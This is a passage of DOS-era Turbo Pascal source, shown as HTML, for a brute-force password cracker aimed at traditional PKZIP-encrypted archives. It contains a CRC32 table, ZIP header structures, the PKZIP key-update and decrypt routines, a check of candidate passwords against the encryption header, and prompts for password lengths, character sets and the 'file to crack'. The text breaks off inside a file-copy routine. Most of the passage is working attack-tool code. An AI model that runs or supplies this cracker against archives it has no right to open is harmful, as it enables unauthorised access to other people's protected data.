&nbsp;&nbsp; $35B5A8FA, $42B2986C, $DBBBC9D6, $ACBCF940, <br>
&nbsp;&nbsp; $32D86CE3, $45DF5C75, $DCD60DCF, $ABD13D59, <br>
&nbsp;&nbsp; $26D930AC, $51DE003A, $C8D75180, $BFD06116, <br>
&nbsp;&nbsp; $21B4F4B5, $56B3C423, $CFBA9599, $B8BDA50F, <br>
&nbsp;&nbsp; $2802B89E, $5F058808, $C60CD9B2, $B10BE924, <br>
&nbsp;&nbsp; $2F6F7C87, $58684C11, $C1611DAB, $B6662D3D, <br>
&nbsp;&nbsp; $76DC4190, $01DB7106, $98D220BC, $EFD5102A, <br>
&nbsp;&nbsp; $71B18589, $06B6B51F, $9FBFE4A5, $E8B8D433, <br>
&nbsp;&nbsp; $7807C9A2, $0F00F934, $9609A88E, $E10E9818, <br>
&nbsp;&nbsp; $7F6A0DBB, $086D3D2D, $91646C97, $E6635C01, <br>
&nbsp;&nbsp; $6B6B51F4, $1C6C6162, $856530D8, $F262004E, <br>
&nbsp;&nbsp; $6C0695ED, $1B01A57B, $8208F4C1, $F50FC457, <br>
&nbsp;&nbsp; $65B0D9C6, $12B7E950, $8BBEB8EA, $FCB9887C, <br>
&nbsp;&nbsp; $62DD1DDF, $15DA2D49, $8CD37CF3, $FBD44C65, <br>
&nbsp;&nbsp; $4DB26158, $3AB551CE, $A3BC0074, $D4BB30E2, <br>
&nbsp;&nbsp; $4ADFA541, $3DD895D7, $A4D1C46D, $D3D6F4FB, <br>
&nbsp;&nbsp; $4369E96A, $346ED9FC, $AD678846, $DA60B8D0, <br>
&nbsp;&nbsp; $44042D73, $33031DE5, $AA0A4C5F, $DD0D7CC9, <br>
&nbsp;&nbsp; $5005713C, $270241AA, $BE0B1010, $C90C2086, <br>
&nbsp;&nbsp; $5768B525, $206F85B3, $B966D409, $CE61E49F, <br>
&nbsp;&nbsp; $5EDEF90E, $29D9C998, $B0D09822, $C7D7A8B4, <br>
&nbsp;&nbsp; $59B33D17, $2EB40D81, $B7BD5C3B, $C0BA6CAD, <br>
&nbsp;&nbsp; $EDB88320, $9ABFB3B6, $03B6E20C, $74B1D29A, <br>
&nbsp;&nbsp; $EAD54739, $9DD277AF, $04DB2615, $73DC1683, <br>
&nbsp;&nbsp; $E3630B12, $94643B84, $0D6D6A3E, $7A6A5AA8, <br>
&nbsp;&nbsp; $E40ECF0B, $9309FF9D, $0A00AE27, $7D079EB1, <br>
&nbsp;&nbsp; $F00F9344, $8708A3D2, $1E01F268, $6906C2FE, <br>
&nbsp;&nbsp; $F762575D, $806567CB, $196C3671, $6E6B06E7, <br>
&nbsp;&nbsp; $FED41B76, $89D32BE0, $10DA7A5A, $67DD4ACC, <br>
&nbsp;&nbsp; $F9B9DF6F, $8EBEEFF9, $17B7BE43, $60B08ED5, <br>
&nbsp;&nbsp; $D6D6A3E8, $A1D1937E, $38D8C2C4, $4FDFF252, <br>
&nbsp;&nbsp; $D1BB67F1, $A6BC5767, $3FB506DD, $48B2364B, <br>
&nbsp;&nbsp; $D80D2BDA, $AF0A1B4C, $36034AF6, $41047A60, <br>
&nbsp;&nbsp; $DF60EFC3, $A867DF55, $316E8EEF, $4669BE79, <br>
&nbsp;&nbsp; $CB61B38C, $BC66831A, $256FD2A0, $5268E236, <br>
&nbsp;&nbsp; $CC0C7795, $BB0B4703, $220216B9, $5505262F, <br>
&nbsp;&nbsp; $C5BA3BBE, $B2BD0B28, $2BB45A92, $5CB36A04, <br>
&nbsp;&nbsp; $C2D7FFA7, $B5D0CF31, $2CD99E8B, $5BDEAE1D, <br>
&nbsp;&nbsp; $9B64C2B0, $EC63F226, $756AA39C, $026D930A, <br>
&nbsp;&nbsp; $9C0906A9, $EB0E363F, $72076785, $05005713, <br>
&nbsp;&nbsp; $95BF4A82, $E2B87A14, $7BB12BAE, $0CB61B38, <br>
&nbsp;&nbsp; $92D28E9B, $E5D5BE0D, $7CDCEFB7, $0BDBDF21, <br>
&nbsp;&nbsp; $86D3D2D4, $F1D4E242, $68DDB3F8, $1FDA836E, <br>
&nbsp;&nbsp; $81BE16CD, $F6B9265B, $6FB077E1, $18B74777, <br>
&nbsp;&nbsp; $88085AE6, $FF0F6A70, $66063BCA, $11010B5C, <br>
&nbsp;&nbsp; $8F659EFF, $F862AE69, $616BFFD3, $166CCF45, <br>
&nbsp;&nbsp; $A00AE278, $D70DD2EE, $4E048354, $3903B3C2, <br>
&nbsp;&nbsp; $A7672661, $D06016F7, $4969474D, $3E6E77DB, <br>
&nbsp;&nbsp; $AED16A4A, $D9D65ADC, $40DF0B66, $37D83BF0, <br>
&nbsp;&nbsp; $A9BCAE53, $DEBB9EC5, $47B2CF7F, $30B5FFE9, <br>
&nbsp;&nbsp; $BDBDF21C, $CABAC28A, $53B39330, $24B4A3A6, <br>
&nbsp;&nbsp; $BAD03605, $CDD70693, $54DE5729, $23D967BF, <br>
&nbsp;&nbsp; $B3667A2E, $C4614AB8, $5D681B02, $2A6F2B94, <br>
&nbsp;&nbsp; $B40BBE37, $C30C8EA1, $5A05DF1B, $2D02EF8D <br>
&nbsp; ); </p>

<p>type <br>
&nbsp;CopyBufT = array [1..MAXBUF] of char;{ Copy Buffer&nbsp;&nbsp;&nbsp; } <br>
&nbsp;CopyBufTP = ^COpyBufT;&nbsp;&nbsp;&nbsp; { Ptr to Copy Buffer&nbsp; } <br>
&nbsp;Buf12T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = array [0..11] of Char; { 12-byte
buffer&nbsp;&nbsp; } <br>
&nbsp;SetOfCharT = Set of Char;&nbsp;&nbsp;&nbsp; { Set of characters&nbsp;&nbsp; } <br>
&nbsp;CharArrayT = Array [0..255] of Char; { List of characters&nbsp; } <br>
&nbsp;CharSetT = record&nbsp;&nbsp;&nbsp;&nbsp; { Character Set for Zip PW } <br>
&nbsp;&nbsp;&nbsp;&nbsp; n : 0..256;&nbsp;&nbsp;&nbsp; { ..# of chars in the set } <br>
&nbsp;&nbsp;&nbsp;&nbsp; c : CharArrayT;&nbsp;&nbsp; { ..List of PW chars&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; s : SetOfCharT;&nbsp;&nbsp; { ..PW chars in set format } <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end; <br>
&nbsp;ZipHdrT&nbsp;&nbsp;&nbsp;&nbsp; = record&nbsp;&nbsp;&nbsp;&nbsp; { Zip File
Header&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; Sig&nbsp; : LongInt;&nbsp; { ..Signature&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; VerReqd : Word;&nbsp;&nbsp; { ..Version reqd to unzip } <br>
&nbsp;&nbsp;&nbsp;&nbsp; BitFlag : Word;&nbsp;&nbsp; { ..Bit Flag&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; Method : Word;&nbsp;&nbsp; { ..Compress Method&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; LModTime: Word;&nbsp;&nbsp; { ..Last Mod Time&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; LModDate: Word;&nbsp;&nbsp; { ..Last Mod Date&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; CRC32 : LongInt;&nbsp; { ..File CRC&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; CmpSize : LongInt;&nbsp; { ..Compressed Size&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; UncmpSz : LongInt;&nbsp; { ..Uncompressed Size&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; FNLen : Word;&nbsp;&nbsp; { ..File Name Length&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; EFLen : Word;&nbsp;&nbsp; { ..Extra Field Length&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end; <br>
&nbsp;ZDHdrT&nbsp; = Record&nbsp;&nbsp;&nbsp;&nbsp; { Directory File Header&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; Sig&nbsp; : LongInt;&nbsp; { ..Signature&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; Version : Word;&nbsp;&nbsp; { ..Version made by&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; VerReqd : Word;&nbsp;&nbsp; { ..Version reqd to extract } <br>
&nbsp;&nbsp;&nbsp;&nbsp; BitFlag : Word;&nbsp;&nbsp; { ..Bit Flag&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; Method : Word;&nbsp;&nbsp; { ..Compression Method&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; LModTime: Word;&nbsp;&nbsp; { ..Last Mod time&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; LModDate: Word;&nbsp;&nbsp; { ..Last Mod Date&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; CRC32 : LongInt;&nbsp; { ..CRC or 0&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; CmpSize : LongInt;&nbsp; { ..Compressed Size&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; UncmpSz : LongInt;&nbsp; { ..Uncompressed Size&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; FNLen : Word;&nbsp;&nbsp; { ..File Name Length&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; EFLen : Word;&nbsp;&nbsp; { ..Extra Field Length&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; FCLen : Word;&nbsp;&nbsp; { ..File Comment Length&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; DiskNo : Word;&nbsp;&nbsp; { ..Starting Disk Number } <br>
&nbsp;&nbsp;&nbsp;&nbsp; IFAttr : Word;&nbsp;&nbsp; { ..Internal File Attributes} <br>
&nbsp;&nbsp;&nbsp;&nbsp; EFAttr : LongInt;&nbsp; { ..External File Attributes} <br>
&nbsp;&nbsp;&nbsp;&nbsp; LHOff : LongInt;&nbsp; { ..Offset of local header } <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end; <br>
&nbsp;ZDEndT&nbsp;&nbsp; = Record&nbsp;&nbsp;&nbsp;&nbsp; { Directory End Record&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; Sig&nbsp; : LongInt;&nbsp; { ..Signature&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; DiskNo : Word;&nbsp;&nbsp; { ..Number of this disk&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; ZDDisk : Word;&nbsp;&nbsp; { ..Disk w/ start of dir } <br>
&nbsp;&nbsp;&nbsp;&nbsp; ZDETD : Word;&nbsp;&nbsp; { ..Dir ents this disk&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; ZDEnts : Word;&nbsp;&nbsp; { ..Total dir ents&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; ZDSize : LongInt;&nbsp; { ..Dir size&nbsp;&nbsp;&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp; ZDStart : LongInt;&nbsp; { ..Offset to start of Dir } <br>
&nbsp;&nbsp;&nbsp;&nbsp; CmtLen : Word;&nbsp;&nbsp; { ..Zip Comment Length&nbsp; } <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end; </p>

<p>var PkunzipPath : String;&nbsp;&nbsp;&nbsp; { Path &amp; File name for PKUNZIP } <br>
&nbsp;ZipfilePath : String;&nbsp;&nbsp;&nbsp; { Path &amp; File name for Zipfile } <br>
&nbsp;ZipfileName : String;&nbsp;&nbsp;&nbsp; { File name for Zipfile&nbsp;&nbsp; } <br>
&nbsp;RamPath&nbsp; : String;&nbsp;&nbsp;&nbsp; { Path on RAM Drive&nbsp;&nbsp;&nbsp; } <br>
&nbsp;MemberName : String;&nbsp;&nbsp;&nbsp; { Zipfile Member Name&nbsp;&nbsp; } <br>
&nbsp;MinPWLen : Integer;&nbsp;&nbsp;&nbsp; { Minimum password length&nbsp; } <br>
&nbsp;MaxPWLen : Integer;&nbsp;&nbsp;&nbsp; { Maximum password length&nbsp; } <br>
&nbsp;PWCharSet : CharSetT;&nbsp;&nbsp;&nbsp; { Password character set&nbsp; } <br>
&nbsp;PWSaveInt : LongInt;&nbsp;&nbsp;&nbsp; { Password Save Interval&nbsp; } <br>
&nbsp;UseRamDisk : Boolean;&nbsp;&nbsp;&nbsp; { Use RAM Disk?&nbsp;&nbsp;&nbsp;&nbsp; } <br>
&nbsp;RamDrive : Char;&nbsp;&nbsp;&nbsp;&nbsp; { Ram Disk Drive Letter&nbsp;&nbsp; } <br>
&nbsp;NextPW&nbsp; : array [1..MAXPW] of Byte;{ Next password to try&nbsp; } <br>
&nbsp;rc&nbsp;&nbsp;&nbsp; : Integer; <br>
&nbsp;PWLen&nbsp; : Integer; <br>
&nbsp;PW&nbsp;&nbsp; : String; <br>
&nbsp;Key0&nbsp; : LongInt;&nbsp;&nbsp;&nbsp; { Zip Encryption Key 0&nbsp;&nbsp; } <br>
&nbsp;Key1&nbsp; : LongInt;&nbsp;&nbsp;&nbsp; { Zip Encryption Key 1&nbsp;&nbsp; } <br>
&nbsp;Key2&nbsp; : LongInt;&nbsp;&nbsp;&nbsp; { Zip Encryption Key 2&nbsp;&nbsp; } <br>
&nbsp;ZipBuf&nbsp; : Buf12T;&nbsp;&nbsp;&nbsp; { Zip Encryption Buffer&nbsp;&nbsp; } <br>
&nbsp;ZipFile&nbsp; : File; <br>
&nbsp;ZDEnd&nbsp; : ZDEndT;&nbsp;&nbsp;&nbsp; { Zip Directory End Record&nbsp; } <br>
&nbsp;ZDHdr&nbsp; : ZDHdrT;&nbsp;&nbsp;&nbsp; { Zip Directory Header Record } <br>
&nbsp;ZipHdr&nbsp; : ZipHdrT;&nbsp;&nbsp;&nbsp; { Zip Local Header Record&nbsp; } <br>
&nbsp;Ok&nbsp;&nbsp; : Boolean; <br>
&nbsp; </p>

<p>function crc32(crc : LongInt; c : Char) : LongInt; <br>
begin <br>
&nbsp;crc32 := ((crc shr 8) and $00FFFFFF) xor CrcTab[(Ord(c) xor (crc and $00FF))&nbsp;
and $00FF]; <br>
end; </p>

<p>procedure ZipPWUpdateKeys(C : Char); <br>
begin <br>
&nbsp;Key0 := crc32(Key0, C); <br>
&nbsp;Key1 := Key1 + (Key0 and $000000FF); <br>
&nbsp;Key1 := Key1 * 134775813 + 1; <br>
&nbsp;Key2 := crc32(Key2, Chr((Key1 shr 24) and $000000FF)); <br>
end; </p>

<p>function ZipPWDecryptByte : Char; <br>
var Temp : Word; <br>
begin <br>
&nbsp;Temp := (Key2 or 2) and $0000FFFF; <br>
&nbsp;ZipPWDecryptByte := Chr(((Temp * (Temp xor 1)) shr 8) and $00FF); <br>
end; </p>

<p>procedure ZipPWInitKeys(PW : String); <br>
var n : Integer; <br>
begin <br>
&nbsp;Key0 := K0; <br>
&nbsp;Key1 := K1; <br>
&nbsp;Key2 := K2; <br>
&nbsp;for n := 1 to Length(PW) do ZipPWUpdateKeys(PW[n]); <br>
end; </p>

<p>procedure ZipPWUpdateBuf(var Buf : Buf12T); <br>
var i : Integer; <br>
&nbsp;c : Char; <br>
begin <br>
&nbsp;for i := 0 to 11 do begin <br>
&nbsp; c := Chr(Ord(Buf[i]) xor Ord(ZipPWDecryptByte)); <br>
&nbsp; ZipPWUpdateKeys(c); <br>
&nbsp; Buf[i] := c; <br>
&nbsp;end; <br>
end; </p>

<p>function ZipPWCheck(PW : String; Buf : Buf12T; crc : LongInt) : Boolean; <br>
begin <br>
&nbsp;ZipPWInitKeys(PW); <br>
&nbsp;ZipPWUpdateBuf(Buf); <br>
&nbsp;ZipPWCheck := Ord(Buf[11]) = ((crc shr 24) and $000000FF); <br>
end; </p>

<p>function ZipOpen(var F : File; Name : String; var ZDEnd : ZDEndT) : Boolean; <br>
var FMSave&nbsp; : Word; <br>
&nbsp;SeekPos : LongInt; <br>
begin <br>
&nbsp;if Pos('.', Name) = 0 then Name := Name + '.ZIP'; <br>
&nbsp;Assign(F, Name); <br>
&nbsp;FMSave := FileMode; <br>
&nbsp;FileMode := 0; <br>
&nbsp;{$I-} Reset(F, 1); {$I+} <br>
&nbsp;FileMode := FMSave; <br>
&nbsp;if IOResult &lt;&gt; 0 then begin <br>
&nbsp;&nbsp; WriteLn(Name, ': Cannot open file'); <br>
&nbsp; ZipOpen := FALSE; <br>
&nbsp; Exit; <br>
&nbsp;end; <br>
&nbsp;SeekPos := FileSize(F) - sizeof(ZDEnd) + 1; <br>
&nbsp;while TRUE do begin <br>
&nbsp; if SeekPos &lt;= 0 then begin <br>
&nbsp;&nbsp; WriteLn(Name, ': Cannot find ZIP Directory'); <br>
&nbsp;&nbsp; Close(F); <br>
&nbsp;&nbsp; ZipOpen := FALSE; <br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end; <br>
&nbsp; Dec(SeekPos); <br>
&nbsp; Seek(F, SeekPos); <br>
&nbsp; BlockRead(F, ZDEnd, sizeof(ZDEnd)); <br>
&nbsp; if ZDEnd.Sig = ZDENDSIG then begin <br>
&nbsp;&nbsp; ZipOpen := TRUE; <br>
&nbsp;&nbsp; Exit; <br>
&nbsp; end; <br>
&nbsp;end; <br>
end; </p>

<p>function ZipFindZDHdr(var F : File; Name : String; var ZDEnd : ZDEndT; var ZDHdr :
ZDHdrT) : Boolean; <br>
var n&nbsp; : Word; <br>
&nbsp;SeekPos : LongInt; <br>
&nbsp;Buf&nbsp; : String; <br>
&nbsp;FNLen : Integer; <br>
&nbsp;i&nbsp; : Integer; <br>
begin <br>
&nbsp;FNLen := Length(Name); <br>
&nbsp;Buf[0] := Chr(FNLen); <br>
&nbsp;for i := 1 to FNLen do Name[i] := UpCase(Name[i]); <br>
&nbsp;SeekPos := ZDEnd.ZDStart; <br>
&nbsp;for n := 1 to ZDEnd.ZDEnts do begin <br>
&nbsp; Seek(F, SeekPos); <br>
&nbsp; BlockRead(F, ZDHdr, sizeof(ZDHdr)); <br>
&nbsp; if ZDHdr.FNLen = FNLen then begin <br>
&nbsp;&nbsp; BlockRead(F, Buf[1], FNLen); <br>
&nbsp;&nbsp; for i := 1 to FNLen do Buf[i] := UpCase(Buf[i]); <br>
&nbsp;&nbsp; if Name = Buf then begin <br>
&nbsp;&nbsp;&nbsp; ZipFindZDHdr := TRUE; <br>
&nbsp;&nbsp;&nbsp; Exit; <br>
&nbsp;&nbsp; end; <br>
&nbsp; end; <br>
&nbsp; SeekPos := SeekPos + sizeof(ZDHdr) + ZDHdr.FNLen + ZDHdr.EFLen + ZDHdr.FCLen; <br>
&nbsp;end; <br>
&nbsp;ZipFindZDHdr := FALSE; <br>
end; </p>

<p>function ZipFindFile(var F : File; Name : String; var ZDEnd : ZDEndT; var ZDHdr :
ZDHdrT; var ZipHdr : ZipHdrT) : Boolean; <br>
var Ok : Boolean; <br>
begin <br>
&nbsp;Ok := ZipFindZDHdr(F, Name, ZDEnd, ZDHdr); <br>
&nbsp;if not Ok then begin <br>
&nbsp; ZipFindFile := FALSE; <br>
&nbsp; Exit; <br>
&nbsp;end; <br>
&nbsp;Seek(F, ZDHdr.LHOff); <br>
&nbsp;BlockRead(F, ZipHdr, sizeof(ZipHdr)); <br>
&nbsp;Seek(F, ZDHdr.LHOff + sizeof(ZipHdr) + ZipHdr.FNLen + ZipHdr.EFLen); <br>
&nbsp;ZipFindFile := TRUE; <br>
end; </p>

<p>procedure AddCharToCharSet(var SC : CharSetT; c : Char); <br>
begin <br>
&nbsp;if SC.n = 0 then SC.s := []; <br>
&nbsp;if not (c in SC.s) then begin <br>
&nbsp; SC.c[SC.n] := c; <br>
&nbsp; SC.s := SC.s + [c]; <br>
&nbsp; inc(SC.n); <br>
&nbsp;end; <br>
end; </p>

<p>procedure AddStringToCharSet(var SC : CharSetT; S : String); <br>
var n : Integer; <br>
begin <br>
&nbsp;for n := 1 to length(S) do AddCharToCharSet(SC, S[n]); <br>
end; </p>

<p>procedure AddSetToCharSet(var SC : CharSetT; S : SetOfCharT); <br>
var n : Integer; <br>
begin <br>
&nbsp;for n := 0 to 255 do begin <br>
&nbsp; if Chr(n) in S then AddCharToCharSet(SC, Chr(n)); <br>
&nbsp;end; <br>
end; </p>

<p>function PromptChar(p : String; r : String) : Char; <br>
var K&nbsp; : Char; <br>
&nbsp;S&nbsp; : String; <br>
&nbsp;Done : Boolean; <br>
begin <br>
&nbsp;Done := FALSE; <br>
&nbsp;while not Done do begin <br>
&nbsp; Write(p, '? '); <br>
&nbsp; ReadLn(S); <br>
&nbsp; if length(s) = 0 then K := #$00 <br>
&nbsp; else K := S[1]; <br>
&nbsp; if Pos(K, r) &lt;&gt; 0 then Done := TRUE <br>
&nbsp; else WriteLn('Enter one of: ', r); <br>
&nbsp;end; <br>
&nbsp;PromptChar := K; <br>
end; </p>

<p>function PromptString(p : String) : String; <br>
var S : String; <br>
begin <br>
&nbsp;Write(p, '? '); <br>
&nbsp;ReadLn(S); <br>
&nbsp;PromptString := S; <br>
end; </p>

<p>function PromptNumber(p : String; Min, Max : LongInt) : LongInt; <br>
var S&nbsp; : String; <br>
&nbsp;Code : Integer; <br>
&nbsp;R&nbsp; : LongInt; <br>
&nbsp;Done : Boolean; <br>
begin <br>
&nbsp;Done := FALSE; <br>
&nbsp;while not Done do begin <br>
&nbsp; S := PromptString(p); <br>
&nbsp; val(S, R, Code); <br>
&nbsp; if (Code &lt;&gt; 0) or (R &lt; Min) or (R &gt; Max) then <br>
&nbsp;&nbsp; WriteLn('Enter an integer from ', Min, ' to ', Max) <br>
&nbsp; else Done := TRUE; <br>
&nbsp;end; <br>
&nbsp;PromptNumber := R; <br>
end; </p>

<p>procedure PromptCharSet(p : String; var SC : CharSetT); <br>
var K&nbsp; : Char; <br>
begin <br>
&nbsp;SC.n := 0; <br>
&nbsp;WriteLn(p, ':'); <br>
&nbsp;K := PromptChar('&nbsp; Lower case letters [a..z]', 'YyNn'); <br>
&nbsp;if UpCase(K) = 'Y' then AddSetToCharSet(SC, ['a'..'z']); <br>
&nbsp;K := PromptChar('&nbsp; Upper case letters [A..Z]', 'YyNn'); <br>
&nbsp;if UpCase(K) = 'Y' then AddSetToCharSet(SC, ['A'..'Z']); <br>
&nbsp;K := PromptChar('&nbsp; Digits [0..9]', 'YyNn'); <br>
&nbsp;if UpCase(K) = 'Y' then AddSetToCharSet(SC, ['0'..'9']); <br>
&nbsp;K := PromptChar('&nbsp; Blank', 'YyNn'); <br>
&nbsp;if UpCase(K) = 'Y' then AddStringToCharSet(SC, ' '); <br>
&nbsp;K := PromptChar('&nbsp; Punctuation and special characters', 'YyNn'); <br>
&nbsp;if UpCase(K) = 'Y' then AddStringToCharSet(SC,
'`~!@#$%^&amp;*()_-+=[{]}\|;:&quot;,&lt;.&gt;/?'''); <br>
end; </p>

<p>function PromptFilename(p : String; ext : String; path : String) : String; <br>
var fn&nbsp; : String; <br>
&nbsp;fn2&nbsp; : String; <br>
&nbsp;Done : Boolean; <br>
&nbsp;i&nbsp; : Integer; <br>
begin <br>
&nbsp;Done := FALSE; <br>
&nbsp;while not DONE do begin <br>
&nbsp; fn := PromptString(p); <br>
&nbsp; if pos('.', fn) = 0 then fn := fn + '.' + ext; <br>
&nbsp; for i:=1 to length(fn) do fn[i] := UpCase(fn[i]); <br>
&nbsp; fn2 := FSearch(fn, path); <br>
&nbsp; if fn2 = '' then WriteLn('Unable to locate ', fn) <br>
&nbsp; else Done := TRUE; <br>
&nbsp;end; <br>
&nbsp;fn := FExpand(fn2); <br>
&nbsp;for i:=1 to length(fn) do fn[i] := UpCase(fn[i]); <br>
&nbsp;PromptFilename := fn; <br>
end; </p>

<p>function GetRestartData : Boolean; <br>
var Key&nbsp;&nbsp; : Char; <br>
&nbsp;SaveF : File; <br>
begin <br>
&nbsp;FillChar(NextPW, MAXPW, 0); <br>
&nbsp;MinPWLen := 0; <br>
&nbsp;MaxPWLen := 0; <br>
&nbsp;PWCharSet.n := 0; <br>
&nbsp;PWLen := 0; <br>
&nbsp;GetRestartData := FALSE; <br>
&nbsp;if (FSearch(SaveFN, '') &lt;&gt; '') then begin <br>
&nbsp; Key := PromptChar('Restart from last password', 'YyNn'); <br>
&nbsp; if upcase(Key) = 'Y' then begin <br>
&nbsp;&nbsp; Assign(SaveF, SaveFN); <br>
&nbsp;&nbsp; FileMode := 0; <br>
&nbsp;&nbsp; Reset(SaveF, 1); <br>
&nbsp;&nbsp; FileMode := 2; <br>
&nbsp;&nbsp; BlockRead(SaveF, MinPWLen,&nbsp; sizeof(MinPWLen)); <br>
&nbsp;&nbsp; BlockRead(SaveF, MaxPWLen,&nbsp; sizeof(MaxPWLen)); <br>
&nbsp;&nbsp; BlockRead(SaveF, PWCharSet, sizeof(PWCharSet)); <br>
&nbsp;&nbsp; BlockRead(SaveF, PWLen,&nbsp;&nbsp;&nbsp;&nbsp; sizeof(PWLen)); <br>
&nbsp;&nbsp; BlockRead(SaveF, NextPW,&nbsp;&nbsp;&nbsp; sizeof(NextPW)); <br>
&nbsp;&nbsp; Close(SaveF); <br>
&nbsp;&nbsp; GetRestartData := TRUE; <br>
&nbsp; end; <br>
&nbsp;end; <br>
end; </p>

<p>function ExecPkunzip(cmdline : String) : Integer; <br>
begin <br>
&nbsp;SwapVectors; <br>
&nbsp;Exec(PkunzipPath, cmdline); <br>
&nbsp;SwapVectors; <br>
&nbsp;if DosError &lt;&gt; 0 then begin <br>
&nbsp; WriteLn('DOS Error ', DosError, ' executing ', PkunzipPath); <br>
&nbsp; Halt(3); <br>
&nbsp;end; <br>
&nbsp;ExecPkunzip := DosExitCode; <br>
end; </p>

<p>procedure GetInput; <br>
var Key&nbsp; : Char; <br>
&nbsp;D&nbsp; : DirStr; <br>
&nbsp;N&nbsp; : NameStr; <br>
&nbsp;E&nbsp; : ExtStr; <br>
&nbsp;Done : Boolean; <br>
&nbsp;rc&nbsp; : Integer; <br>
begin <br>
&nbsp;if not GetRestartData then begin <br>
&nbsp; MinPWLen := PromptNumber('Minimum password length', 1, MAXPW); <br>
&nbsp; if MinPWLen = MAXPW then MaxPWLen := MAXPW <br>
&nbsp; else MaxPWLen := PromptNumber('Maximum password length', MinPWLen, MAXPW); <br>
&nbsp; PromptCharSet('Password character set', PWCharSet); <br>
&nbsp; if PWCharSet.n = 0 then begin <br>
&nbsp;&nbsp; WriteLn('No characters in password character set!'); <br>
&nbsp;&nbsp; Halt(3); <br>
&nbsp; end; <br>
&nbsp;end; <br>
&nbsp;PWSaveInt := PromptNumber('Password save interval', 0, 1000000); <br>
&nbsp;Key := PromptChar('Use RAM Disk', 'YyNn'); <br>
&nbsp;if UpCase(Key) &lt;&gt; 'Y' then UseRamDisk := FALSE <br>
&nbsp;else begin <br>
&nbsp; UseRamDisk := TRUE; <br>
&nbsp; Key := PromptChar('RAM Disk drive letter',
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'); <br>
&nbsp; RamDrive := UpCase(Key); <br>
&nbsp; RamPath := RamDrive + ':' + WorkDir; <br>
&nbsp;end; </p>

<p>&nbsp;PkunzipPath := FSearch('PKUNZIP.EXE', GetEnv('PATH')); <br>
&nbsp;if PkunzipPath &lt;&gt; '' then PkunzipPath := FExpand(PkunzipPath) <br>
&nbsp;else PkunzipPath := PromptFilename('PKUNZIP file name', 'EXE', GetEnv('PATH')); </p>

<p>&nbsp;ZipfilePath := PromptFilename('Zip file name', 'ZIP', ''); <br>
&nbsp;FSplit(ZipfilePath, D, N, E); <br>
&nbsp;ZipfileName := N + E; <br>
&nbsp;Done := FALSE; <br>
&nbsp;while not Done do begin <br>
&nbsp; MemberName := PromptString('File to crack'); <br>
&nbsp; rc := ExecPkunzip('-# -v ' + ZipfilePath + ' ' + MemberName); <br>
&nbsp; if rc &lt;&gt; 0 then WriteLn('Unable to locate ', MemberName, ' in ', ZipfilePath)
<br>
&nbsp; else Done := TRUE; <br>
&nbsp;end; <br>
end; </p>

<p>function CopyFile(FromFile, ToFile : String) : Boolean; <br>
var pBuf&nbsp;&nbsp;&nbsp;&nbsp; : CopyBufTP; <br>
&nbsp;FromF&nbsp;&nbsp;&nbsp; : File; <br>
&nbsp;ToF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : File; <br>
&nbsp;Count&nbsp; : Word; <br>
&nbsp;Written&nbsp; : Word; <br>
begin <br>
&nbsp;{$I-} <br>
&nbsp;Assign(FromF, FromFile); <br>
&nbsp;FileMode := 0; <br>
&nbsp;Reset(FromF, 1); <br>
&nbsp;FileMode := 2; <br>
&nbsp;if IOResult &lt;&gt; 0 then begin <br>
&nbsp; CopyFile := FALSE; <br>
&nbsp; Exit; <br>
&nbsp;end; <br>
&nbsp;Assign(ToF, ToFile); <br>
&nbsp;Rewrite(ToF, 1); <br>
&nbsp;if IOResult &lt;&gt; 0 then begin <br>
&nbsp; Close(FromF); <br>
&nbsp; CopyFile := FALSE; <br>
&nbsp; Exit; <br>
&nbsp;end; <br>
&nbsp;{$I+} <br>
&nbsp;New(pBuf); <br>
&nbsp;repeat <br>
&nbsp; BlockRead(FromF, pBuf^, MAXBUF, Count); <br>
&nbsp; BlockWrite(ToF, pBuf^, Count, Written); <br>
&nbsp; if Written &lt;&gt; Count then begin <br>
&nbsp;&nbsp; Close(FromF); <br>
